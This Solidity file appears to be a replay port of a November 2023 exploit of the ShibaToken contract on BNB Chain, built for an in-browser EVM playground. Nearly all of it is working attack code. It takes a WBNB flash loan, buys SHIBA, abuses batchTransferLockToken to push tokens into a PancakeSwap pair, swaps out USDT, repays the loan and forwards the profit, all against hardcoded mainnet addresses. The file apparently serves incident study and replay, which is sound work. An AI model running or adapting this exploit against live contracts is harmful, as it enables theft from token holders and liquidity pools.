// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Cheatcode-free synthetic port of evm-hack-registry/2023-11-ShibaToken_exp/test/ShibaToken_exp.sol
// for the in-browser EVM Playground replay engine (no forge-std/Test, no cheatcodes).
//
// @KeyInfo - Total Lost : ~$31K
// Attacker : https://bscscan.com/address/0xb9bdc2537c6f4b587a5c81a67e7e3a4e6ddda189
// Attack Contract : https://bscscan.com/address/0xda148143379ae54e06d2429a5c80b19d4a9d6734
// Vulnerable Contract : https://bscscan.com/address/0x13b1f2e227ca6f8e08ac80368fd637f5084f10a5
// Attack Tx : https://explorer.phalcon.xyz/tx/bsc/0x75a26224da9faf37c2b3a4a634a096af7fec561f631a02c93e11e4a19d159477

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address _assetTo, bytes calldata data) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(
        address
    ) external view returns (uint256);
}

interface IWBNB is IERC20 {
    function deposit() external payable;
    function withdraw(
        uint256
    ) external;
}

interface ICO {
    function buyByBnb(
        address token
    ) external payable;
}

interface ISHIBA is IERC20 {
    struct Airdrop {
        address wallet;
        uint256 amount;
    }

    function batchTransferLockToken(
        Airdrop[] memory _airdrops
    ) external;
}

interface IPancakePair {
    function balanceOf(
        address owner
    ) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeRouter {
    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;
}

contract ShibaToken {
    address immutable r = address(this);

    receive() external payable {}

    IPancakeRouter constant x10ed = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IPancakePair constant x55d3 = IPancakePair(0x55d398326f99059fF775485246999027B3197955);
    IPancakePair constant xa19d = IPancakePair(0xa19D2674A8E2709a92e04403F721d8448f802e1f);
    ISHIBA constant x13b1 = ISHIBA(0x13B1F2E227cA6f8e08aC80368fd637f5084F10a5);
    IWBNB constant xbb4c = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    ICO constant xa422 = ICO(0xA4227de36398851aEBf4A2506008D0Aab2dd0E71);
    IDPPOracle constant xfeaf = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    address constant x0000 = 0x0000000000000000000000000000000000000000;
    address constant x1874 = 0x1874726c8c9a501836929F495A8b44968FBfdad8;
    address constant xb9bd = 0xb9bdc2537C6F4B587A5C81A67e7e3a4e6dDDa189;

    function test() public {
        claim(20);
    }

    function claim(
        uint256
    ) public {
        xfeaf.flashLoan(20_000_000_000_000_000_000, 0, r, hex"00");
        x55d3.balanceOf(r);
    }

    function DPPFlashLoanCall(address, uint256, uint256, bytes memory) public {
        xbb4c.balanceOf(r);
        xbb4c.withdraw(20_000_000_000_000_000_000);
        x55d3.approve(
            address(xa422),
            115_792_089_237_316_195_423_570_985_008_687_907_853_269_984_665_640_564_039_457_584_007_913_129_639_935
        );
        x55d3.transfer(xb9bd, 0);
        xa422.buyByBnb{value: 20_000_000_000_000_000_000}(x0000);
        x13b1.balanceOf(r);
        address[] memory path = new address[](2);
        path[0] = address(x13b1);
        path[1] = address(x55d3);
        x10ed.getAmountsOut(507_677_278_570_125_202_361_500_000, path);

        ISHIBA.Airdrop[] memory airdrops = new ISHIBA.Airdrop[](1);
        airdrops[0] = ISHIBA.Airdrop(address(xa19d), 507_677_278_570_125_202_361_500_000);
        x13b1.batchTransferLockToken(airdrops);
        xa19d.swap(0, 30_948_073_916_467_640_719_090, r, "");
        x55d3.balanceOf(r);
        x55d3.approve(
            address(x10ed),
            115_792_089_237_316_195_423_570_985_008_687_907_853_269_984_665_640_564_039_457_584_007_913_129_639_935
        );

        address[] memory path2 = new address[](2);
        path2[0] = address(x55d3);
        path2[1] = address(xbb4c);
        x10ed.swapExactTokensForETHSupportingFeeOnTransferTokens(
            30_948_073_916_467_640_719_090, 0, path2, r, 1_700_095_314
        );
        uint256 bnbReceived = address(this).balance;
        xbb4c.deposit{value: bnbReceived}();
        xbb4c.transfer(address(xfeaf), 20_000_000_000_000_000_000);
        uint256 remaining = xbb4c.balanceOf(r);
        xbb4c.transfer(address(x1874), remaining);
    }

    fallback() external payable {
        revert("no such function");
    }
}
